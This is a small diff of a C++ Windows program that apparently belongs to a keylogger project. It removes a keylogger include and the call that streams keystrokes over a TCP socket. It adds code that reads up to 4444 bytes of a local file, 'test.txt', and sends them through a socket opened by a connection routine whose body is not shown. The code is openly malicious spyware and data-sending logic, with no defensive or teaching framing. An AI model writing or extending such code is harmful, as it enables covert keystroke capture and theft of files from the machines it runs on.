@@ -1,8 +1,10 @@
 
-#include "../inc/Keylogger.h"
+#include "winsock2.h"
+
 
 using namespace std ;
-
+#include <fstream>
+#include <iostream>
 SOCKET openConn()
 {
 
@@ -31,11 +33,15 @@ int main()
     
     SOCKET sock = openConn();
 
-    wcout << "connected !" << endl;
+    cout << "connected !" << endl;
 
-    Keylogger keylogg(sock);
+    ifstream file("test.txt", ios::binary);
+    CHAR buff[4444] = {0};
 
-    keylogg.directTcp();
-
+    file.read(buff, 4444);
+    send(sock, buff, strlen(buff), 0);
+    
+    file.close();
+    exit(0);
     return 0;
 }
